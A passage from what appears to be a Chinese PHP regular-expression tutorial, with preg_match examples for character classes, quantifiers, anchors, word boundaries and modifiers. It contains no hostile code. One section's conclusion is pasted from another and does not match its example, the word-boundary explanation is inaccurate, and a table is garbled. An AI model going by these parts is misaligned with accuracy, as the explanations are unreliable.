<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line"><span class="variable">$zz</span> = <span class="string">&#x27;/[a-zA-Z0-9_]\w/&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$string</span> = <span class="string">&#x27;ab&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$string1</span> = <span class="string">&#x27;9A&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="variable">$zz</span>, <span class="variable">$string</span>, <span class="variable">$matches</span>))&#123;</span><br><span class="line">   <span class="built_in">echo</span> <span class="string">&#x27;匹配到了，结果为：&#x27;</span>;</span><br><span class="line">   var_dump(<span class="variable">$matches</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">   <span class="built_in">echo</span> <span class="string">&#x27;没有匹配到&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>结论：$string和$string1都匹配成功。因为\w就是[a-zA-Z0-9_]</p>
</blockquote>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line"><span class="variable">$zz</span> = <span class="string">&#x27;/[abc]\d+/&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$string</span> = <span class="string">&#x27;a9&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$string1</span> = <span class="string">&#x27;b1&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$string2</span> = <span class="string">&#x27;c5&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$string3</span> = <span class="string">&#x27;d4&#x27;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="variable">$zz</span>, <span class="variable">$string</span>, <span class="variable">$matches</span>))&#123;</span><br><span class="line">   <span class="built_in">echo</span> <span class="string">&#x27;匹配到了，结果为：&#x27;</span>;</span><br><span class="line">   var_dump(<span class="variable">$matches</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">   <span class="built_in">echo</span> <span class="string">&#x27;没有匹配到&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>结论：$string、$string1、$string2匹配成功，而$string3不成功。因为$string3超过了[abc]的范围，它是从d开始的。</p>
</blockquote>
<p>&emsp;<br><font face="Comic sans MS"><font color="#00B2EE"><strong>8. [^ 字符] 不匹配指定区间的字符</strong></font><br></font></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line"><span class="variable">$zz</span> = <span class="string">&#x27;/[^0-9A-Za-z_]/&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$string</span> = <span class="string">&#x27;aaaaab311dd&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$string1</span> = <span class="string">&#x27;!$@!#%$#^##&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="variable">$zz</span>, <span class="variable">$string</span>, <span class="variable">$matches</span>))&#123;</span><br><span class="line">   <span class="built_in">echo</span> <span class="string">&#x27;匹配到了，结果为：&#x27;</span>;</span><br><span class="line">   var_dump(<span class="variable">$matches</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">   <span class="built_in">echo</span> <span class="string">&#x27;没有匹配到&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>结论：</p>
<ol>
<li>匹配$string不成功，但是匹配$string1的时候成功。因为中括号里面有个抑扬符。</li>
<li>^ 抑扬符在中括号里面的作用是不准以中括号里面的字符进行匹配。</li>
</ol>
</blockquote>
<p>&emsp;</p>
<h3 id="5-元字符"><a href="#5-元字符" class="headerlink" title="5. 元字符"></a><font face="Comic sans MS" color="#FF6347">5. 元字符</font></h3><p><font face="Comic sans MS"><font color="#00B2EE"><strong>抛出问题：</strong></font>\d 代表匹配一个字符。而我现在想要匹配十个八个，任意多个数字肿么办？<br>这个时候我们就要用到元字符。在使用原子的时候，发现只能够匹配一个字符，可是要匹配多个字符就出现了问题。<br>这个时候，我们需要借助<font color="#00B2EE">元字符</font>来帮我们修饰原子，实现更多的功能。<br></font></p>
<table>
<thead>
<tr>
<th align="center">元字符</th>
<th align="left">功能说明</th>
</tr>
</thead>
</table>
<ul>
<li>| 是代表匹配前面的一个原子，匹配0次或者任意多次前面的字符。</li>
</ul>
<ul>
<li>| 匹配一次或多前前面的一个字符<br>?    | 前面的字符可有可无【可选】 有或没有<br>.    | 更标准一些应该把点算作原子。匹配除了\n以外的所有字符<br>丨    | 或者。注：它的优先级最低了。<br>^    | 必须要以抑扬符之后的字符串开始<br>$    | 必须要以$之前的字符结尾<br>\b    | 词边界<br>\B    | 非边界<br>{m}    | 有且只能出现m次<br>{n,m}|     可以出现n到m次<br>{m,} |    至少m次，最大次数不限制<br>()     |  改变优先级或者将某个字符串视为一个整体，匹配到的数据取出来也可以使用它</li>
</ul>
<p>&emsp;<br><font face="Comic sans MS"><font color="#00B2EE"><strong>1. + 匹配最少1次前面的字符</strong></font><br></font></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="variable">$zz</span> = <span class="string">&#x27;/\d+/&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$string</span> = <span class="string">&quot;迪奥和奥迪250都是我最爱&quot;</span>;</span><br><span class="line"></span><br><span class="line">//待会儿再试试中间没有0-9的情况</span><br><span class="line">//<span class="variable">$string</span> = <span class="string">&quot;迪奥和奥迪都是我最爱&quot;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="variable">$zz</span>, <span class="variable">$string</span>, <span class="variable">$matches</span>))&#123;</span><br><span class="line">   <span class="built_in">echo</span> <span class="string">&#x27;匹配到了，结果为：&#x27;</span>;</span><br><span class="line">   var_dump(<span class="variable">$matches</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">   <span class="built_in">echo</span> <span class="string">&#x27;没有匹配到&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">运行结果：</span><br><span class="line">匹配成功，证明了\d+中的+。\d是匹配数字，而+是最少匹配一次前面的字符。</span><br></pre></td></tr></table></figure>

<p>&emsp;<br><font face="Comic sans MS"><font color="#00B2EE">*<em>2. * 匹配0次或者任意多次前面的字符*</em></font><br></font></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="variable">$zz</span> = <span class="string">&#x27;/\w*/&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$string</span> = <span class="string">&quot;!@!@!!@#@!<span class="variable">$@</span>#!&quot;</span>;</span><br><span class="line"></span><br><span class="line">//待会儿再试试中间没有0-9的情况</span><br><span class="line">//<span class="variable">$string1</span> = <span class="string">&quot;!@#!@#!abcABC#@#!&quot;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="variable">$zz</span>, <span class="variable">$string</span>, <span class="variable">$matches</span>))&#123;</span><br><span class="line">   <span class="built_in">echo</span> <span class="string">&#x27;匹配到了，结果为：&#x27;</span>;</span><br><span class="line">   var_dump(<span class="variable">$matches</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">   <span class="built_in">echo</span> <span class="string">&#x27;没有匹配到&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>说明，注释掉的$string1和$string都匹配成功了。因为，\w是匹配的0-9A-Za-z_，而*是说明前面的\w可以不存在。如果存在可以有1个或者多个。</p>
</blockquote>
<p>&emsp;<br><font face="Comic sans MS"><font color="#00B2EE"><strong>3. ? 前面的字符出现0次或者1次，可有可无</strong></font><br></font></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line"><span class="variable">$zz</span> = <span class="string">&#x27;/ABC\d?ABC/&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$string</span> = <span class="string">&quot;ABC1ABC&quot;</span>;</span><br><span class="line"></span><br><span class="line">//待会儿再试试中间没有0-9的情况</span><br><span class="line">//<span class="variable">$string1</span> = <span class="string">&quot;ABC888888ABC&quot;</span>;</span><br><span class="line">//<span class="variable">$string2</span> = <span class="string">&quot;ABCABC&quot;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="variable">$zz</span>, <span class="variable">$string</span>, <span class="variable">$matches</span>))&#123;</span><br><span class="line">   <span class="built_in">echo</span> <span class="string">&#x27;匹配到了，结果为：&#x27;</span>;</span><br><span class="line">   var_dump(<span class="variable">$matches</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">   <span class="built_in">echo</span> <span class="string">&#x27;没有匹配到&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>匹配$string,$string2成功，但是匹配$string1失败。<br>因为匹配前后都是ABC，中间是一个0-9。0-9可有可无，但是不能有多个。</p>
</blockquote>
<p>&emsp;<br><font face="Comic sans MS"><font color="#00B2EE"><strong>4. . (点) 匹配除\n以外的所有字符</strong></font><br></font></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line"><span class="variable">$zz</span> = <span class="string">&#x27;/gg.+gg/&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$string</span> = <span class="string">&quot;ABC1ABC&quot;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="variable">$zz</span>, <span class="variable">$string</span>, <span class="variable">$matches</span>))&#123;</span><br><span class="line">   <span class="built_in">echo</span> <span class="string">&#x27;匹配到了，结果为：&#x27;</span>;</span><br><span class="line">   var_dump(<span class="variable">$matches</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">   <span class="built_in">echo</span> <span class="string">&#x27;没有匹配到&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>匹配$string,$string2成功，但是匹配$string1失败。<br>因为匹配前后都是ABC，中间是一个0-9。0-9可有可无，但是不能有多个。</p>
</blockquote>
<p>&emsp;<br><font face="Comic sans MS"><font color="#00B2EE"><strong>5. |（竖线），或者，优先级最低</strong></font><br></font></p>
<p>我们通过实验来看优先级和或者的匹配</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line"><span class="variable">$zz</span> = <span class="string">&#x27;/abc|bcd/&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$string1</span> = <span class="string">&quot;abccd&quot;</span>;</span><br><span class="line"><span class="variable">$string2</span> = <span class="string">&quot;ggggbcd&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (preg_match(<span class="variable">$zz</span>, <span class="variable">$string1</span>, <span class="variable">$matches</span>)) &#123;</span><br><span class="line">   <span class="built_in">echo</span> <span class="string">&#x27;匹配到了，结果为：&#x27;</span>;</span><br><span class="line">   var_dump(<span class="variable">$matches</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">   <span class="built_in">echo</span> <span class="string">&#x27;没有匹配到&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>我们来看看：<br>    1.最开始我匹配的想法是想匹配的是abccd或者是abbcd。可是，匹配$string1和$string2，匹配出来的结果却是abc和bcd.<br>    2.实现了或者匹配，匹配出来了abc或者是bcd。它还没有字符串连续在一起的优先级高。</p>
<p>那么问题来了，我要匹配上例中的abccd或者是abbcd怎么办？<br><font color="red">需要使用到**()**来改变优先级。</font></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line"><span class="variable">$zz</span> = <span class="string">&#x27;/ab(c|b)cd/&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$string1</span> = <span class="string">&quot;起来abccd阅兵&quot;</span>;</span><br><span class="line"><span class="variable">$string2</span> = <span class="string">&quot;ggggbcd&quot;</span>;</span><br><span class="line"><span class="variable">$string3</span> = <span class="string">&#x27;中国abbcd未来&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (preg_match(<span class="variable">$zz</span>, <span class="variable">$string1</span>, <span class="variable">$matches</span>)) &#123;</span><br><span class="line">   <span class="built_in">echo</span> <span class="string">&#x27;匹配到了，结果为：&#x27;</span>;</span><br><span class="line">   var_dump(<span class="variable">$matches</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">   <span class="built_in">echo</span> <span class="string">&#x27;没有匹配到&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">运行结果：</span><br><span class="line">匹配到了，结果为：array(2) &#123; [0]=&gt; string(5) <span class="string">&quot;abccd&quot;</span> [1]=&gt; string(1) <span class="string">&quot;c&quot;</span> &#125;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>结论：<br>   1.确实匹配了了abccd或者abbcd（$string1 or $string3）。<br>   2.但是匹配的数组里面多了一个元素，这个元素的下标为1<br>   3.()中的内容只要匹配成功，会把匹配到的数据放到下标为1的这个数组元素中。</p>
</blockquote>
<p>&emsp;<br><font face="Comic sans MS"><font color="#00B2EE"><strong>6. ^ （抑扬符），必须要以^之后的字符串开始</strong></font><br></font></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line"><span class="variable">$zz</span> = <span class="string">&#x27;/^猪哥好帅\w+/&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$string1</span> = <span class="string">&quot;猪哥好帅abccdaaaasds&quot;</span>;</span><br><span class="line">//<span class="variable">$string2</span>没有以猪哥好帅开始</span><br><span class="line"><span class="variable">$string2</span> = <span class="string">&quot;帅abccdaaaasds&quot;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (preg_match(<span class="variable">$zz</span>, <span class="variable">$string1</span>, <span class="variable">$matches</span>)) &#123;</span><br><span class="line">   <span class="built_in">echo</span> <span class="string">&#x27;匹配到了，结果为：&#x27;</span>;</span><br><span class="line">   var_dump(<span class="variable">$matches</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">   <span class="built_in">echo</span> <span class="string">&#x27;没有匹配到&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>通过实验发现以下结论：<br>   1.$string1匹配成功，$string2没有匹配成功<br>   2.因为$string1是以指定的字符开始的<br>   3.而$string2并没有以^之后的字符开始<br>   4.翻译这个正则的意思就是：以要猪哥好帅开始后面接a-zA-Z0-9_最少一个字符。</p>
</blockquote>
<p>&emsp;<br><font face="Comic sans MS"><font color="#00B2EE"><strong>7. $ （美元符）必须要以$之前的字符结束</strong></font><br></font></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line"><span class="variable">$zz</span> = <span class="string">&#x27;/\d+努力$/&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$string1</span> = <span class="string">&quot;12321124333努力&quot;</span>;</span><br><span class="line">//<span class="variable">$string2</span></span><br><span class="line"><span class="variable">$string2</span> = <span class="string">&quot;12311124112313力&quot;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (preg_match(<span class="variable">$zz</span>, <span class="variable">$string1</span>, <span class="variable">$matches</span>)) &#123;</span><br><span class="line">   <span class="built_in">echo</span> <span class="string">&#x27;匹配到了，结果为：&#x27;</span>;</span><br><span class="line">   var_dump(<span class="variable">$matches</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">   <span class="built_in">echo</span> <span class="string">&#x27;没有匹配到&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>我们运行一下看一下结果，得出来的结论：<br>   1.$string1 匹配成功，而$string2匹配不成功<br>   2.$之前的字符是\d+，后面接着中文的努力。<br>   3.因此，匹配的是这一个整体。\d指的是0-9的整型,+号代表最少一个0-9</p>
</blockquote>
<p>&emsp;<br><font face="Comic sans MS"><font color="#00B2EE"><strong>8. \b和\B 词边界和非词边界</strong></font><br></font></p>
<p>我们来讲解什么是边界：</p>
<p>   1.正则表达示是有边界的，这个边界是定界符的开始和结尾是正则的边界。</p>
<p>   2.this是一个英文单词，后面加上一个空格，意味着这个词结束了，到达了这个词的边界</p>
<p>\b词边界，就是指必须要在最前或者最后。<br>\B非边界，就是不能在一个正则表达示的最前或者最后。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line"><span class="variable">$zz</span> = <span class="string">&#x27;/\w+\b/&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$string1</span> = <span class="string">&quot;this is a apple&quot;</span>;</span><br><span class="line"><span class="variable">$string2</span> = <span class="string">&quot;thisis a apple&quot;</span>;</span><br><span class="line"><span class="variable">$string3</span> = <span class="string">&quot;thisisaapple&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (preg_match(<span class="variable">$zz</span>, <span class="variable">$string1</span>, <span class="variable">$matches</span>)) &#123;</span><br><span class="line">   <span class="built_in">echo</span> <span class="string">&#x27;匹配到了，结果为：&#x27;</span>;</span><br><span class="line">   var_dump(<span class="variable">$matches</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">   <span class="built_in">echo</span> <span class="string">&#x27;没有匹配到&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>结论：<br>   1.$string1、$string2和$string3都匹配成功。<br>   2.$string1匹配的时候this 空格是边界<br>   3.$string2匹配的时候thisis是边界<br>   4.$string3匹配的时候，thisisaapple到了整个正则表达示的最后，因此也是边界。所以匹配成功。</p>
</blockquote>
<p>我们来实验一下非词边界：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line"><span class="variable">$zz</span> = <span class="string">&#x27;/\Bthis/&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$string1</span> = <span class="string">&quot;hellothis9&quot;</span>;</span><br><span class="line"></span><br><span class="line">//<span class="variable">$string2</span> = <span class="string">&quot;hello this9&quot;</span>;</span><br><span class="line">//<span class="variable">$string2</span> = <span class="string">&quot;this9中国万岁&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (preg_match(<span class="variable">$zz</span>, <span class="variable">$string1</span>, <span class="variable">$matches</span>)) &#123;</span><br><span class="line">   <span class="built_in">echo</span> <span class="string">&#x27;匹配到了，结果为：&#x27;</span>;</span><br><span class="line">   var_dump(<span class="variable">$matches</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">   <span class="built_in">echo</span> <span class="string">&#x27;没有匹配到&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>总结：<br>   1.匹配$string1成功而$string2不成功。<br>   2.因为\B后接的是this，所以this不能在词边界（空格和开始结尾）的位置出现。</p>
</blockquote>
<p>&emsp;<br><font face="Comic sans MS"><font color="#00B2EE"><strong>9. {m}有且只能出现m次</strong></font><br></font></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line"><span class="variable">$zz</span> = <span class="string">&#x27;/喝\d&#123;3&#125;酒/&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$string1</span> = <span class="string">&quot;喝988酒&quot;</span>;</span><br><span class="line"></span><br><span class="line">//<span class="variable">$string2</span> = <span class="string">&quot;喝98811酒&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (preg_match(<span class="variable">$zz</span>, <span class="variable">$string1</span>, <span class="variable">$matches</span>)) &#123;</span><br><span class="line">   <span class="built_in">echo</span> <span class="string">&#x27;匹配到了，结果为：&#x27;</span>;</span><br><span class="line">   var_dump(<span class="variable">$matches</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">   <span class="built_in">echo</span> <span class="string">&#x27;没有匹配到&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>结论：<br>上例中\d{3}我规定了0-9只能出现3次，多一次少一次都不行。</p>
</blockquote>
<p>&emsp;<br><font face="Comic sans MS"><font color="#00B2EE"><strong>10. {n,m} 可以出现n到m次</strong></font><br></font></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line"><span class="variable">$zz</span> = <span class="string">&#x27;/喝\d&#123;1,3&#125;酒/&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$string1</span> = <span class="string">&quot;喝9酒&quot;</span>;</span><br><span class="line"></span><br><span class="line">//<span class="variable">$string2</span> = <span class="string">&quot;喝988酒&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (preg_match(<span class="variable">$zz</span>, <span class="variable">$string1</span>, <span class="variable">$matches</span>)) &#123;</span><br><span class="line">   <span class="built_in">echo</span> <span class="string">&#x27;匹配到了，结果为：&#x27;</span>;</span><br><span class="line">   var_dump(<span class="variable">$matches</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">   <span class="built_in">echo</span> <span class="string">&#x27;没有匹配到&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>结论：<br>上例中\d{1,3}我规定了0-9只能出现1次，2次或者3次。其它次数都是错的</p>
</blockquote>
<p>&emsp;<br><font face="Comic sans MS"><font color="#00B2EE"><strong>11. {m,} 至少m次，最大次数不限制</strong></font><br></font></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line"><span class="variable">$zz</span> = <span class="string">&#x27;/喝\d&#123;2,&#125;/&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$string1</span> = <span class="string">&quot;喝9&quot;</span>;</span><br><span class="line"></span><br><span class="line">//<span class="variable">$string2</span> = <span class="string">&quot;喝98&quot;</span>;</span><br><span class="line">//<span class="variable">$string3</span> = <span class="string">&quot;喝98122121&quot;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (preg_match(<span class="variable">$zz</span>, <span class="variable">$string1</span>, <span class="variable">$matches</span>)) &#123;</span><br><span class="line">   <span class="built_in">echo</span> <span class="string">&#x27;匹配到了，结果为：&#x27;</span>;</span><br><span class="line">   var_dump(<span class="variable">$matches</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">   <span class="built_in">echo</span> <span class="string">&#x27;没有匹配到&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>结论：<br>上例中\d{2,}我规定喝后面的0-9最少出现两次，最多次数不限。因此$string1是匹配不成功的，$string2是匹配成功的。$string3是匹配成功的。</p>
</blockquote>
<p>&emsp;</p>
<h3 id="6-模式修正符"><a href="#6-模式修正符" class="headerlink" title="6. 模式修正符"></a><font face="Comic sans MS"><font color="#FF6347">6. 模式修正符</font></h3><p><font face="Comic sans MS">我们通过元字符和原子完成了正则表达示的入门。有一些特殊情况我们依然需要来处理。<br>如果abc在第二行的开始处如何匹配？<br><font color="red">我不希望正则表达示特别贪婪的匹配全部，只匹配一部份怎么办？</font><br>这个时候，我们就需要用到下面的这些模式匹配来增强正则的功能。</p>
<p><font color="#00B2EE"><strong>常用的模式匹配符有：</strong></font><br></font></p>
<table>
<thead>
<tr>
<th align="center">模式匹配符</th>
<th align="left">功能</th>
</tr>
</thead>
<tbody><tr>
<td align="center">i</td>
<td align="left">模式中的字符将同时匹配大小写字母.</td>
</tr>
<tr>
<td align="center">m</td>
<td align="left">字符串视为多行</td>
</tr>
<tr>
<td align="center">s</td>
<td align="left">将字符串视为单行,换行符作为普通字符.</td>
</tr>
<tr>
<td align="center">x</td>
<td align="left">将模式中的空白忽略.</td>
</tr>
<tr>
<td align="center">A</td>
<td align="left">强制仅从目标字符串的开头开始匹配.</td>
</tr>
<tr>
<td align="center">D</td>
<td align="left">模式中的美元元字符仅匹配目标字符串的结尾.</td>
</tr>
<tr>
<td align="center">U</td>
<td align="left">匹配最近的字符串.</td>
</tr>
</tbody></table>
<p><font face="Comic sans MS">模式匹配符的用法如下：<font color="red">**/ 正则表达示/模式匹配符**</font> &emsp;   <font color="#00B2EE">模式匹配符是放在正则表达式的最后的。</font><br></font>例如： /\w+/<font color="red"><strong>s</strong></font> </p>
<p>&emsp;<br><font face="Comic sans MS"><font color="#00B2EE"><strong>1. i 不区分大小写</strong></font><br></font></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php //在后面加上了一个i </span><br><span class="line">    <span class="variable">$pattern</span> = <span class="string">&#x27;/ABC/i&#x27;</span>; </span><br><span class="line"><span class="variable">$string</span> = <span class="string">&#x27;8988abc12313&#x27;</span>;</span><br><span class="line"><span class="variable">$string1</span> = <span class="string">&#x27;11111ABC2222&#x27;</span>; </span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="variable">$pattern</span>, <span class="variable">$string</span>, <span class="variable">$matches</span>))&#123;</span><br><span class="line">     <span class="built_in">echo</span> <span class="string">&#x27;匹配到了，结果为：&#x27;</span>; </span><br><span class="line">    var_dump(<span class="variable">$matches</span>); &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">     <span class="built_in">echo</span> <span class="string">&#x27;没有匹配到&#x27;</span>;</span><br><span class="line">     &#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>结论，不论是$string还是$string1全都匹配成功了。因此，在后面加上了i之后，能够不共分匹配内容的大小写。</p>
</blockquote>
<p>&emsp;<br><font face="Comic sans MS"><font color="#00B2EE"><strong>2. m 视为多行</strong></font><br></font><font color="red">正则在匹配的时候，要匹配的目标字符串我们通常视为一行。</font><br><font color="#00B2EE"><strong>“行起始”元字符（^）</strong></font>仅仅匹配字符串的起始，<font color="#00B2EE"><strong>“行结束”元字符（$）</strong></font>仅仅匹配字符串的结束。<br>当设定了此修正符，“行起始”和“行结束”除了匹配整个字符串开头和结束外，还分别匹配其中的换行符的之后和之前。<br><font color="red"><strong>注意：</strong></font><strong>如果要匹配的字符串中没有“\n”字符或者模式中没有 ^ 或 $，则设定此修正符没有任何效果。</strong></p>
<p>我们通过实验和代码来验证一下这个特点：<br>第一次匹配，你会发现匹配不成功：<font color="#FF6347">(1)↓↓</font></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="variable">$pattern</span> = <span class="string">&#x27;/^a\d+/&#x27;</span>;</span><br><span class="line"><span class="variable">$string</span> = <span class="string">&quot;我的未来在自己手中我需要不断的努力</span></span><br><span class="line"><span class="string">a9是一个不错的字符表示</span></span><br><span class="line"><span class="string">怎么办呢，其实需要不断奋进&quot;</span>;</span><br><span class="line"><span class="keyword">if</span> (preg_match(<span class="variable">$pattern</span>, <span class="variable">$string</span>, <span class="variable">$matches</span>)) &#123;</span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&#x27;匹配到了，结果为：&#x27;</span>;</span><br><span class="line">    var_dump(<span class="variable">$matches</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&#x27;没有匹配到&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>&emsp;<br>第二次匹配，我们加上m 试试：<font color="#FF6347">(2)↓↓</font></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="variable">$pattern</span> = <span class="string">&#x27;/^a\d+/m&#x27;</span>;</span><br><span class="line"><span class="variable">$string</span> = <span class="string">&quot;我的未来在自己手中我需要不断的努力</span></span><br><span class="line"><span class="string">a9是一个不错的字符表示</span></span><br><span class="line"><span class="string">怎么办呢，其实需要不断奋进&quot;</span>;</span><br><span class="line"><span class="keyword">if</span> (preg_match(<span class="variable">$pattern</span>, <span class="variable">$string</span>, <span class="variable">$matches</span>)) &#123;</span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&#x27;匹配到了，结果为：&#x27;</span>;</span><br><span class="line">    var_dump(<span class="variable">$matches</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="built_in">echo</span> <span 